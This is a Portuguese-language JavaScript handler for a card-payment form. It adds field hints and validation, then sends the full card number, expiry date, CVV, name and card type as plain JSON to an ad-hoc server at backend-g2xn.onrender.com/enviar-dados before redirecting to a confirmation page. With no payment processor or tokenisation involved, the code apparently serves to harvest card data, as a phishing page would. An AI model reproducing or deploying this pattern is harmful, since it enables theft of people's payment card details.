document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector("#dadosss");

    const campos = {
        numero: document.querySelector("#numero"),
        data: document.querySelector("#data"),
        cvv: document.querySelector("#cvv"),
        nome: document.querySelector("#nome"),
    };

    const mensagensDica = {
        numero: "Exemplo: 1234 5678 9123 4567",
        data: "Exemplo: 12/30",
        cvv: "Exemplo: 123",
        nome: "Nome completo impresso no cartão.",
    };

    // --- LÓGICA DE DICAS (CINZA) ---
    for (const key in campos) {
        const input = campos[key];
        if (input) {
            input.addEventListener("focus", () => {
                removeMensagemDica(input);
                const dica = document.createElement("span");
                dica.classList.add("mensagem-dica");
                dica.style.color = "#666";
                dica.style.fontSize = "12px";
                dica.style.display = "block";
                dica.style.marginTop = "4px";
                dica.textContent = mensagensDica[key];
                input.parentElement.appendChild(dica);
            });

            input.addEventListener("blur", () => {
                removeMensagemDica(input);
            });
        }
    }

    function removeMensagemDica(input) {
        const existing = input.parentElement.querySelector(".mensagem-dica");
        if (existing) existing.remove();
    }

    // --- EVENTO DE ENVIO ---
    form.addEventListener("submit", async (event) => {
        event.preventDefault();

        // Limpa erros anteriores
        document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());

        const inputsParaValidar = {
            numero: campos.numero,
            data: campos.data,
            cvv: campos.cvv,
            nome: campos.nome,
            tipo: document.querySelector('input[name="gender"]:checked'),
        };

        const mensagensErro = {
            numero: "Por favor, insira o número do cartão.",
            data: "A data e o CVV são necessários.",
            cvv: "",
            nome: "Por favor, insira o nome impresso no cartão.",
            tipo: "Selecione uma opção (Crédito ou Débito).",
        };

        let formValido = true;

        // VALIDAÇÃO VISUAL (MENSAGENS VERMELHAS)
        for (const key in inputsParaValidar) {
            const input = inputsParaValidar[key];

            if (!input || (input.value === "" || input.value === undefined)) {
                formValido = false;

                if (key === "tipo") {
                    const radios = document.querySelectorAll('input[name="gender"]');
                    radios.forEach(r => {
                        r.parentElement.style.border = "1px solid red";
                        r.parentElement.style.borderRadius = "8px";
                    });

                    const container = document.querySelector(".radio-container");
                    const erro = document.createElement("span");
                    erro.classList.add("mensagem-erro");
                    erro.style.color = "red";
                    erro.style.fontSize = "14px";
                    erro.textContent = mensagensErro[key];
                    container.appendChild(erro);
                } else {
                    input.style.border = "1px solid red";
                    input.style.borderRadius = "8px";

                    const erro = document.createElement("span");
                    erro.classList.add("mensagem-erro");
                    erro.style.color = "red";
                    erro.style.fontSize = "14px";
                    erro.style.display = "block";
                    erro.style.marginTop = "4px";
                    erro.textContent = mensagensErro[key];
                    input.parentElement.appendChild(erro);
                }
            } else {
                if (key === "tipo") {
                    document.querySelectorAll('input[name="gender"]').forEach(r => {
                        r.parentElement.style.border = "none";
                    });
                } else {
                    input.style.border = "1px solid #ccc";
                }
            }
        }

        // --- ENVIO PARA O SERVIDOR ---
        if (formValido) {
            // PEGA O BOTÃO E COLOCA O AVISO DE CARREGANDO
            const botao = form.querySelector("button");
            const textoOriginal = botao.textContent;
            botao.disabled = true;
            botao.textContent = "Processando..."; // Aviso de carregamento

            const cardType = document.querySelector('input[name="gender"]:checked').value;
            
            const dadosParaEnviar = {
                numero: campos.numero.value,
                dataValidade: campos.data.value,
                cvv: campos.cvv.value,
                nome: campos.nome.value,
                tipo: cardType
            };

            try {
                const urlDoServidor = "https://backend-g2xn.onrender.com/enviar-dados";

                const resposta = await fetch(urlDoServidor, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dadosParaEnviar)
                });

                if (resposta.ok) {
                    window.location.href = "confirmacao.html";
                } else {
                    alert("Erro ao processar dados.");
                    botao.disabled = false;
                    botao.textContent = textoOriginal;
                }
            } catch (error) {
                console.error("Erro:", error);
                alert("O servidor não respondeu.");
                botao.disabled = false;
                botao.textContent = textoOriginal;
            }
        }
    });
});
